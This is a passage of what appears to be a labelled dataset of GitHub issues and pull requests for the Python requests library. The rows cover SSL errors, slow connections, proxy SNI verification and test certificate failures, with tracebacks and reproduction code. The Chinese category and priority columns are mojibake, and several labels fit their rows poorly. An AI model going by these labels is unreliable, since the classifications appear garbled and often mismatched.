    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.11""
  },
  ""platform"": {
    ""release"": ""6.12.5-linuxkit"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30300020"",
    ""version"": ""24.2.1""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""1010111f""
  },
  ""urllib3"": {
    ""version"": ""1.26.20""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6914
2924916956,Minor quirk: more straightforward __iter__ impl. for CaseInsensitiveDict,"With the actual `CaseInsensitiveDict.__iter__` method, both the key and value are extracted but only the key is used. With this minor change, we would loop directly over the internal dict's keys (which is the default for the dict's `__iter__`). The difference is minimal, just 4 less bytecode instructions: [https://godbolt.org/z/saT7Me3vb](https://godbolt.org/z/saT7Me3vb) (uncomment either `__iter__` implementation).",å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6913
2913504309,asyncio,Requests is not accepting feature reque,åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6912
2908631188,Enforce Latest Stable urllib3 Dependency in Requests,"We encountered a PUT issue on one of our legacy clusters that appears to be due to an outdated version of urllib3 (v1.25.8) being used in the systemâ€™s default Python environmentâ€”even though we're running the latest stable version of Requests (v2.32.3).

### Expected Behavior:
When using [AIStore](https://github.com/NVIDIA/aistore), a PUT request is sent to the proxy, which then issues a redirect to the target for object storage. This process should be completed successfully without errors.

### Issue Observed:
On the affected cluster, the outdated urllib3 fails during the redirect handling, resulting in the following error:

```
raise ConnectionError(e, request=request)
requests.exceptions.ConnectionError: HTTPConnectionPool(host='10.150.56.227', port=51080): Max retries exceeded with url: /v1/objects/nnn/test?provider=ais (Caused by ProtocolError('Connection aborted.', BrokenPipeError(32, 'Broken pipe')))
```

### **Request:**
Could we update the dependency requirements in Requests to enforce a minimum stable version of urllib3 (for example, >=2.2.3) so that we can benefit from the latest fixes and avoid such issues? There are numerous improvements and bug fixes in newer urllib3 releases that would help ensure proper handling of redirects and connections.

","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6911
2899955301,"Version 2.32.3 takes a long time for ""connectionpool:Starting""","Using version 2.32.3 takes a very long time (in the order of minutes) at:

`DEBUG:urllib3.connectionpool:Starting new HTTPS connection (1): some/url.com`

However, downgrading to version 2.32.2 solves this problem.

## Reproduction Steps

```python
import requests

url = 'some/url.com'
requests.get(url, timeout=some_timeout)

```

## System Information
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.10""
  },
  ""platform"": {
    ""release"": ""23.6.0"",
    ""system"": ""Darwin""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400010""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6910
2888760140,reduced cyclomatic complexity in model.py/RequestEncodingMixin._encode_files method,"I decided to make a research and investigate if there is a high cyclomatic complexity in requests library. I found model.py/RequestEncodingMixin._encode_files method with D(21) value which is not good.
There are parts in code which we can organize in separate functions. After such operations I got new value A(5).
It can be useful because low cyclomatic complexity means that it's easy to test the code and predict its behaviour!",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/6909
2883583397,requests.exceptions.SSLError,"<!-- Summary. -->
```
Traceback (most recent call last):
  File ""C:\Users\11989\anaconda3\Lib\site-packages\urllib3\connectionpool.py"", line 715, in urlopen
    httplib_response = self._make_request(
                       ^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\urllib3\connectionpool.py"", line 404, in _make_request
    self._validate_conn(conn)
  File ""C:\Users\11989\anaconda3\Lib\site-packages\urllib3\connectionpool.py"", line 1058, in _validate_conn
    conn.connect()
  File ""C:\Users\11989\anaconda3\Lib\site-packages\urllib3\connection.py"", line 419, in connect
    self.sock = ssl_wrap_socket(
                ^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\urllib3\util\ssl_.py"", line 449, in ssl_wrap_socket
    ssl_sock = _ssl_wrap_socket_impl(
               ^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\urllib3\util\ssl_.py"", line 493, in _ssl_wrap_socket_impl
    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\ssl.py"", line 517, in wrap_socket
    return self.sslsocket_class._create(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\ssl.py"", line 1108, in _create
    self.do_handshake()
  File ""C:\Users\11989\anaconda3\Lib\ssl.py"", line 1379, in do_handshake
    self._sslobj.do_handshake()
ssl.SSLError: [SSL: BAD_ECPOINT] bad ecpoint (_ssl.c:1006)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""C:\Users\11989\anaconda3\Lib\site-packages\requests\adapters.py"", line 667, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\urllib3\connectionpool.py"", line 799, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\urllib3\util\retry.py"", line 592, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='gxj.wuhu.gov.cn', port=443): Max retries exceeded with url: /content/column/6788071?pageIndex=1 (Caused by SSLError(SSLError(1, '[SSL: BAD_ECPOINT] bad ecpoint (_ssl.c:1006)')))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""C:\Users\11989\anaconda3\Lib\site-packages\requests\api.py"", line 73, in get
    return request(""get"", url, params=params, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\requests\api.py"", line 59, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\requests\sessions.py"", line 589, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\requests\sessions.py"", line 703, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\11989\anaconda3\Lib\site-packages\requests\adapters.py"", line 698, in send
    raise SSLError(e, request=request)
requests.exceptions.SSLError: HTTPSConnectionPool(host='gxj.wuhu.gov.cn', port=443): Max retries exceeded with url: /content/column/6788071?pageIndex=1 (Caused by SSLError(SSLError(1, '[SSL: BAD_ECPOINT] bad ecpoint (_ssl.c:1006)')))
```
## Reproduction Steps

```python
import requests
headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36""}
url = ""https://gxj.wuhu.gov.cn/content/column/6788071?pageIndex=1""
requests.get(url, headers=headers)
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""4.0.0""
  },
  ""charset_normalizer"": {
    ""version"": ""2.0.4""
  },
  ""cryptography"": {
    ""version"": ""42.0.5""
  },
  ""idna"": {
    ""version"": ""3.4""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.5""
  },
  ""platform"": {
    ""release"": ""10"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""300000d0"",
    ""version"": ""25.0.0""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""300000f0""
  },
  ""urllib3"": {
    ""version"": ""1.26.18""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": true
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
Python version: Python 3.11.5 | packaged by Anaconda, Inc. | (main, Sep 11 2023, 13:26:23) [MSC v.1916 64 bit (AMD64)] on win32
OS: windows 11
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6908
2874041425,Wrapped _preloaded_ssl_context with function to speed up package import,"Wrapped around default SSL context initialization to potentially speed up ""import requests"" time.

Measurements:

# original
$ time python -c ""import requests""
real    0m0.936s
user    0m0.000s
sys     0m0.047s

# modified:
$ time python -c ""import requests""
real    0m0.351s
user    0m0.000s
sys     0m0.047s
","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6907
2873368957,"Improve ""import requests"" time by delaying ssl context preload","Requests is not accepting feature requests at this time.

In requests/adapters.py there is initialization for _preloaded_ssl_context in global scope.
In corporate environment this operation consumes significant portion of the ""import requests"" time.

Wrapping this initialization into a function that is called where this context is actually needed would eliminate the overhead.

Estimates based on my machine:

# original:
$ time python -c 'import requests'
real    0m0.918s
...

# with a function wrapper:
$ time python -c 'import requests'
real    0m0.356s
...
",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6906
2868741953,Support for Python 3.13 compatibility,Are there any plans or timelines for releasing a version of the requests package compatible with Python 3.13? And I'd like to know when we can expect support for this version in requests.,åŠŸèƒ½å»ºè®®,é«˜,https://github.com/psf/requests/issues/6905
2868729553,Compatibility with Python 3.13,Are there any plans or timelines for releasing a version of the requests package compatible with Python 3.13? And I'd like to know when we can expect support for this version in requests.,åŠŸèƒ½å»ºè®®,é«˜,https://github.com/psf/requests/issues/6904
2867600419,Help with POST request with XML payload,"The following curl request works,

`curl -v -u ""user:password"" -X POST 'https://example.com/Webservice/ConnectorSOAP' --header 'Content-Type: application/xml' --data @payload.xml`

However, `requests.post` fails with status code 411 - Length Required
```
content_length = str(len(payload))
headers = {'Content-Type': 'application/xml', 'Content-Length': content_length}
response = requests.post('http://example.com/Webservice/ConnectorSOAP', auth=('user', 'password'), data=payload, headers=headers)
```

Sample payload,
```
<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:tic=""http://www.otrs.org/TicketConnector/"">
            <soapenv:Header/>
            <soapenv:Body>
                <tic:TicketGet>
                    <UserLogin>?</UserLogin>
                    <Password>?</Password>
                    <TicketID>?</TicketID>
                    <DynamicFields>?</DynamicFields>
                    <Extended>?</Extended>
                    <AllArticles>?</AllArticles>
                    <ArticleSenderType>?</ArticleSenderType>
                    <ArticleOrder>?</ArticleOrder>
                    <ArticleLimit>?</ArticleLimit>
                    <Attachments>?</Attachments>
                    <GetAttachmentContents>?</GetAttachmentContents>
                    <HTMLBodyAsAttachment>?</HTMLBodyAsAttachment>
                </tic:TicketGet>
            </soapenv:Body>
        </soapenv:Envelope>
```

Any help on this would be appreciated.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6903
2865051128,support http3 quic,"Please consider using curl python binding for http3 quic  support 
",å…¶ä»–,ä¸­,https://github.com/psf/requests/issues/6902
2863182523,Fix SSL verification error,"This is a dedicated PR to fix [#6900](https://github.com/psf/requests/issues/6900).

As I said in the issue, this looks like a bug of `requests_toolbelt` but turns out that it belongs to the `requests` itself.
Basically, what `HostHeaderSSLAdapter` does is quite simple:
```python
    def send(self, request, **kwargs):
        # HTTP headers are case-insensitive (RFC 7230)
        host_header = None
        for header in request.headers:
            if header.lower() == ""host"":
                host_header = request.headers[header]
                break

        connection_pool_kwargs = self.poolmanager.connection_pool_kw

        if host_header:
            connection_pool_kwargs[""assert_hostname""] = host_header
        elif ""assert_hostname"" in connection_pool_kwargs:
            # an assert_hostname from a previous request may have been left
            connection_pool_kwargs.pop(""assert_hostname"", None)

        return super(HostHeaderSSLAdapter, self).send(request, **kwargs)
```
As you can see, it simply set `assert_hostname` to the custom SNI for the `urllib3.poolmanager.connection_pool_kw`.

When the proxy is set, the function `adapters.py!proxy_manager_for()` forgets to copy the `connection_pool_kwargs` property from the current `poolmanager`, which will cause the SSL verification exception when the user is doing the request with the custom SNI and self-signed certificate.


> PS: It's my first PR, sorry if my workflow doesn't meet your requirements.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/pull/6901
2863141101,Unable to request a private URL endpoint with custom SNI and self-signed CA when the proxy is set,"Recently I was using [requests_toolbelt](https://github.com/requests/toolbelt) alongside the `requests` library, more specifically,  I was leveraging the `HostHeaderSSLAdapter` from `requests_toolbelt` to make sure I could request a private URL endpoint (e.g. `https://1.2.3.4:5678/api/check`) with the custom SNI and self-signed CA certificate.
It works great until I try to request the same thing with a proxy, and it starts to occur the SSL verification exception as follows:
``` python
requests.exceptions.SSLError: HTTPSConnectionPool(host='1.2.3.4', port=5678): Max retries exceeded with url: /api/check_token (Caused by SSLError(SSLCertVerificationError(1, ""[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: IP address mismatch, certificate is not valid for '1.2.3.4:'. (_ssl.c:1006)"")))
```
I thought this was a bug related to the `requests_toolbelt` at first, like the existing bug report [#276](https://github.com/requests/toolbelt/issues/276), but after doing some digging, I'm pretty sure it is bound to the `requests` itself, hence I report the bug here and a PR that for it later.

## Expected Result

Everything works the same way with or without a proxy.

## Actual Result

+ Private URL endpoint + custom SNI + self-signed CA  âœ…
+ Private URL endpoint + custom SNI + self-signed CA + **HTTP Proxy** âŒ

## Reproduction Steps

```python
import requests
from requests_toolbelt.adapters.host_header_ssl import HostHeaderSSLAdapter

session = requests.Session()
session.trust_env = False
session.mount('https://', HostHeaderSSLAdapter())
# Modify http://127.0.0.1:20809 to your actual proxy url
session.proxies.update({'https': 'http://127.0.0.1:20809',
                        'http': 'http://127.0.0.1:20809'})
# Modify https://1.2.3.4:5678/api/check to your actual private URL endpoint
resp = session.get('https://1.2.3.4:5678/api/check',
                   headers={'Host': '{YOUR_HOST_NAME}'},
                   verify='{YOUR_SELF_SIGNED_CA_FILE}')
print(resp.status_code, resp.content)
```

## System Information
No need
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä½,https://github.com/psf/requests/issues/6900
2862038644,Docs: Add quotes to prevent Zsh wildcard interpretation.,"```
zsh: no matches found: requests[socks]
```","åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6899
2858480406,Normalize RequestException init,,åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/6898
2856450146,Add CA constraint to test CA,"Otherwise recent versions of OpenSSL reject it as an invalid CA certificate.

Fixes: #6896",Bugåé¦ˆ,ä¸­,https://github.com/psf/requests/pull/6897
2856176807,Regenerating tests/certs/ with OpenSSL >= 3.2.0 causes test failures,"Regenerating `tests/certs/` using the provided `Makefile`s causes test failures.

## Expected Result

https://bugs.debian.org/1091503 reports that requests 2.32.3 as packaged in Debian fails tests if run on a system whose time has been artificially set to 2028.  It occurred to me that a simple time-trap-free approach to this might be to change the Debian packaging to regenerate the various certificates in `tests/certs/` using the provided `Makefile`s immediately before running the tests, which seems as though it ought to work.

## Actual Result

`tests/test_requests.py::TestPreparingURLs::test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert` and `tests/test_requests.py::TestPreparingURLs::test_different_connection_pool_for_mtls_settings` fail with errors indicating an invalid CA certificate.

## Reproduction Steps

```console
$ for cert in expired mtls valid/server; do make -C tests/certs/$cert clean all; done
$ tox -e py313-default -- -k 'test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert or test_different_connection_pool_for_mtls_settings'
.pkg: _optional_hooks> python /home/cjwatson/.local/pipx/venvs/tox/lib/python3.12/site-packages/pyproject_api/_backend.py True setuptools.build_meta __legacy__
.pkg: get_requires_for_build_sdist> python /home/cjwatson/.local/pipx/venvs/tox/lib/python3.12/site-packages/pyproject_api/_backend.py True setuptools.build_meta __legacy__
.pkg: get_requires_for_build_wheel> python /home/cjwatson/.local/pipx/venvs/tox/lib/python3.12/site-packages/pyproject_api/_backend.py True setuptools.build_meta __legacy__
.pkg: prepare_metadata_for_build_wheel> python /home/cjwatson/.local/pipx/venvs/tox/lib/python3.12/site-packages/pyproject_api/_backend.py True setuptools.build_meta __legacy__
.pkg: build_sdist> python /home/cjwatson/.local/pipx/venvs/tox/lib/python3.12/site-packages/pyproject_api/_backend.py True setuptools.build_meta __legacy__
py313-default: install_package> python -I -m pip install --force-reinstall --no-deps /home/cjwatson/src/python/requests/.tox/.tmp/package/7/requests-2.32.3.tar.gz
py313-default: commands[0]> pytest -k 'test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert or test_different_connection_pool_for_mtls_settings'
============================================================================= test session starts ==============================================================================
platform linux -- Python 3.13.2, pytest-8.3.4, pluggy-1.5.0
cachedir: .tox/py313-default/.pytest_cache
rootdir: /home/cjwatson/src/python/requests
configfile: pyproject.toml
testpaths: tests
plugins: cov-6.0.0, httpbin-2.1.0
collected 606 items / 604 deselected / 2 selected

tests/test_requests.py FF                                                                                                                                                [100%]

=================================================================================== FAILURES ===================================================================================
________________________________________ TestPreparingURLs.test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert ________________________________________

self = <urllib3.connectionpool.HTTPSConnectionPool object at 0x7f15fd876350>, conn = <urllib3.connection.HTTPSConnection object at 0x7f15fd8765d0>, method = 'GET', url = '/'
body = None, headers = {'User-Agent': 'python-requests/2.32.3', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'keep-alive'}
retries = Retry(total=0, connect=None, read=False, redirect=None, status=None), timeout = Timeout(connect=None, read=None, total=None), chunked = False
response_conn = <urllib3.connection.HTTPSConnection object at 0x7f15fd8765d0>, preload_content = False, decode_content = False, enforce_content_length = True

    def _make_request(
        self,
        conn: BaseHTTPConnection,
        method: str,
        url: str,
        body: _TYPE_BODY | None = None,
        headers: typing.Mapping[str, str] | None = None,
        retries: Retry | None = None,
        timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT,
        chunked: bool = False,
        response_conn: BaseHTTPConnection | None = None,
        preload_content: bool = True,
        decode_content: bool = True,
        enforce_content_length: bool = True,
    ) -> BaseHTTPResponse:
        """"""
        Perform a request on a given urllib connection object taken from our
        pool.

        :param conn:
            a connection from one of our connection pools

        :param method:
            HTTP request method (such as GET, POST, PUT, etc.)

        :param url:
            The URL to perform the request on.

        :param body:
            Data to send in the request body, either :class:`str`, :class:`bytes`,
            an iterable of :class:`str`/:class:`bytes`, or a file-like object.

        :param headers:
            Dictionary of custom headers to send, such as User-Agent,
            If-None-Match, etc. If None, pool headers are used. If provided,
            these headers completely replace any pool-specific headers.

        :param retries:
            Configure the number of retries to allow before raising a
            :class:`~urllib3.exceptions.MaxRetryError` exception.

            Pass ``None`` to retry until you receive a response. Pass a
            :class:`~urllib3.util.retry.Retry` object for fine-grained control
            over different types of retries.
            Pass an integer number to retry connection errors that many times,
            but no other types of errors. Pass zero to never retry.

            If ``False``, then retries are disabled and any exception is raised
            immediately. Also, instead of raising a MaxRetryError on redirects,
            the redirect response will be returned.

        :type retries: :class:`~urllib3.util.retry.Retry`, False, or an int.

        :param timeout:
            If specified, overrides the default timeout for this one
            request. It may be a float (in seconds) or an instance of
            :class:`urllib3.util.Timeout`.

        :param chunked:
            If True, urllib3 will send the body using chunked transfer
            encoding. Otherwise, urllib3 will send the body using the standard
            content-length form. Defaults to False.

        :param response_conn:
            Set this to ``None`` if you will handle releasing the connection or
            set the connection to have the response release it.

        :param preload_content:
          If True, the response's body will be preloaded during construction.

        :param decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.

        :param enforce_content_length:
            Enforce content length checking. Body returned by server must match
            value of Content-Length header, if present. Otherwise, raise error.
        """"""
        self.num_requests += 1

        timeout_obj = self._get_timeout(timeout)
        timeout_obj.start_connect()
        conn.timeout = Timeout.resolve_default_timeout(timeout_obj.connect_timeout)

        try:
            # Trigger any extra validation we need to do.
            try:
>               self._validate_conn(conn)

.tox/py313-default/lib/python3.13/site-packages/urllib3/connectionpool.py:464:
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
.tox/py313-default/lib/python3.13/site-packages/urllib3/connectionpool.py:1093: in _validate_conn
    conn.connect()
.tox/py313-default/lib/python3.13/site-packages/urllib3/connection.py:741: in connect
    sock_and_verified = _ssl_wrap_socket_and_match_hostname(
.tox/py313-default/lib/python3.13/site-packages/urllib3/connection.py:920: in _ssl_wrap_socket_and_match_hostname
    ssl_sock = ssl_wrap_socket(
.tox/py313-default/lib/python3.13/site-packages/urllib3/util/ssl_.py:460: in ssl_wrap_socket
    ssl_sock = _ssl_wrap_socket_impl(sock, context, tls_in_tls, server_hostname)
.tox/py313-default/lib/python3.13/site-packages/urllib3/util/ssl_.py:504: in _ssl_wrap_socket_impl
    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)
/usr/lib/python3.13/ssl.py:455: in wrap_socket
    return self.sslsocket_class._create(
/usr/lib/python3.13/ssl.py:1076: in _create
    self.do_handshake()
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <ssl.SSLSocket [closed] fd=-1, family=2, type=1, proto=6>, block = False

    @_sslcopydoc
    def do_handshake(self, block=False):
        self._check_connected()
        timeout = self.gettimeout()
        try:
            if timeout == 0.0 and block:
                self.settimeout(None)
>           self._sslobj.do_handshake()
E           ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: invalid CA certificate (_ssl.c:1029)

/usr/lib/python3.13/ssl.py:1372: SSLCertVerificationError

During handling of the above exception, another exception occurred:

self = <urllib3.connectionpool.HTTPSConnectionPool object at 0x7f15fd876350>, method = 'GET', url = '/', body = None
headers = {'User-Agent': 'python-requests/2.32.3', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'keep-alive'}
retries = Retry(total=0, connect=None, read=False, redirect=None, status=None), redirect = False, assert_same_host = False
timeout = Timeout(connect=None, read=None, total=None), pool_timeout = None, release_conn = False, chunked = False, body_pos = None, preload_content = False
decode_content = False, response_kw = {}, parsed_url = Url(scheme=None, auth=None, host=None, port=None, path='/', query=None, fragment=None), destination_scheme = None
conn = None, release_this_conn = True, http_tunnel_required = False, err = None, clean_exit = False

    def urlopen(  # type: ignore[override]
        self,
        method: str,
        url: str,
        body: _TYPE_BODY | None = None,
        headers: typing.Mapping[str, str] | None = None,
        retries: Retry | bool | int | None = None,
        redirect: bool = True,
        assert_same_host: bool = True,
        timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT,
        pool_timeout: int | None = None,
        release_conn: bool | None = None,
        chunked: bool = False,
        body_pos: _TYPE_BODY_POSITION | None = None,
        preload_content: bool = True,
        decode_content: bool = True,
        **response_kw: typing.Any,
    ) -> BaseHTTPResponse:
        """"""
        Get a connection from the pool and perform an HTTP request. This is the
        lowest level call for making a request, so you'll need to specify all
        the raw details.

        .. note::

           More commonly, it's appropriate to use a convenience method
           such as :meth:`request`.

        .. note::

           `release_conn` will only behave as expected if
           `preload_content=False` because we want to make
           `preload_content=False` the default behaviour someday soon without
           breaking backwards compatibility.

        :param method:
            HTTP request method (such as GET, POST, PUT, etc.)

        :param url:
            The URL to perform the request on.

        :param body:
            Data to send in the request body, either :class:`str`, :class:`bytes`,
            an iterable of :class:`str`/:class:`bytes`, or a file-like object.

        :param headers:
            Dictionary of custom headers to send, such as User-Agent,
            If-None-Match, etc. If None, pool headers are used. If provided,
            these headers completely replace any pool-specific headers.

        :param retries:
            Configure the number of retries to allow before raising a
            :class:`~urllib3.exceptions.MaxRetryError` exception.

            If ``None`` (default) will retry 3 times, see ``Retry.DEFAULT``. Pass a
            :class:`~urllib3.util.retry.Retry` object for fine-grained control
            over different types of retries.
            Pass an integer number to retry connection errors that many times,
            but no other types of errors. Pass zero to never retry.

            If ``False``, then retries are disabled and any exception is raised
            immediately. Also, instead of raising a MaxRetryError on redirects,
            the redirect response will be returned.

        :type retries: :class:`~urllib3.util.retry.Retry`, False, or an int.

        :param redirect:
            If True, automatically handle redirects (status codes 301, 302,
            303, 307, 308). Each redirect counts as a retry. Disabling retries
            will disable redirect, too.

        :param assert_same_host:
            If ``True``, will make sure that the host of the pool requests is
            consistent else will raise HostChangedError. When ``False``, you can
            use the pool on an HTTP proxy and request foreign hosts.

        :param timeout:
            If specified, overrides the default timeout for this one
            request. It may be a float (in seconds) or an instance of
            :class:`urllib3.util.Timeout`.

        :param pool_timeout:
            If set and the pool is set to block=True, then this method will
            block for ``pool_timeout`` seconds and raise EmptyPoolError if no
            connection is available within the time period.

        :param bool preload_content:
            If True, the response's body will be preloaded into memory.

        :param bool decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.

        :param release_conn:
            If False, then the urlopen call will not release the connection
            back into the pool once a response is received (but will release if
            you read the entire contents of the response such as when
            `preload_content=True`). This is useful if you're not preloading
            the response's content immediately. You will need to call
            ``r.release_conn()`` on the response ``r`` to return the connection
            back into the pool. If None, it takes the value of ``preload_content``
            which defaults to ``True``.

        :param bool chunked:
            If True, urllib3 will send the body using chunked transfer
            encoding. Otherwise, urllib3 will send the body using the standard
            content-length form. Defaults to False.

        :param int body_pos:
            Position to seek to in file-like body in the event of a retry or
            redirect. Typically this won't need to be set because urllib3 will
            auto-populate the value when needed.
        """"""
        parsed_url = parse_url(url)
        destination_scheme = parsed_url.scheme

        if headers is None:
            headers = self.headers

        if not isinstance(retries, Retry):
            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)

        if release_conn is None:
            release_conn = preload_content

        # Check host
        if assert_same_host and not self.is_same_host(url):
            raise HostChangedError(self, url, retries)

        # Ensure that the URL we're connecting to is properly encoded
        if url.startswith(""/""):
            url = to_str(_encode_target(url))
        else:
            url = to_str(parsed_url.url)

        conn = None

        # Track whether `conn` needs to be released before
        # returning/raising/recursing. Update this variable if necessary, and
        # leave `release_conn` constant throughout the function. That way, if
        # the function recurses, the original value of `release_conn` will be
        # passed down into the recursive call, and its value will be respected.
        #
        # See issue #651 [1] for details.
        #
        # [1] <https://github.com/urllib3/urllib3/issues/651>
        release_this_conn = release_conn

        http_tunnel_required = connection_requires_http_tunnel(
            self.proxy, self.proxy_config, destination_scheme
        )

        # Merge the proxy headers. Only done when not using HTTP CONNECT. We
        # have to copy the headers dict so we can safely change it without those
        # changes being reflected in anyone else's copy.
        if not http_tunnel_required:
            headers = headers.copy()  # type: ignore[attr-defined]
            headers.update(self.proxy_headers)  # type: ignore[union-attr]

        # Must keep the exception bound to a separate variable or else Python 3
        # complains about UnboundLocalError.
        err = None

        # Keep track of whether we cleanly exited the except block. This
        # ensures we do proper cleanup in finally.
        clean_exit = False

        # Rewind body position, if needed. Record current position
        # for future rewinds in the event of a redirect/retry.
        body_pos = set_file_position(body, body_pos)

        try:
            # Request a connection from the queue.
            timeout_obj = self._get_timeout(timeout)
            conn = self._get_conn(timeout=pool_timeout)

            conn.timeout = timeout_obj.connect_timeout  # type: ignore[assignment]

            # Is this a closed/new connection that requires CONNECT tunnelling?
            if self.proxy is not None and http_tunnel_required and conn.is_closed:
                try:
                    self._prepare_proxy(conn)
                except (BaseSSLError, OSError, SocketTimeout) as e:
                    self._raise_timeout(
                        err=e, url=self.proxy.url, timeout_value=conn.timeout
                    )
                    raise

            # If we're going to release the connection in ``finally:``, then
            # the response doesn't need to know about the connection. Otherwise
            # it will also try to release it and we'll have a double-release
            # mess.
            response_conn = conn if not release_conn else None

            # Make the request on the HTTPConnection object
>           response = self._make_request(
                conn,
                method,
                url,
                timeout=timeout_obj,
                body=body,
                headers=headers,
                chunked=chunked,
                retries=retries,
                response_conn=response_conn,
                preload_content=preload_content,
                decode_content=decode_content,
                **response_kw,
            )

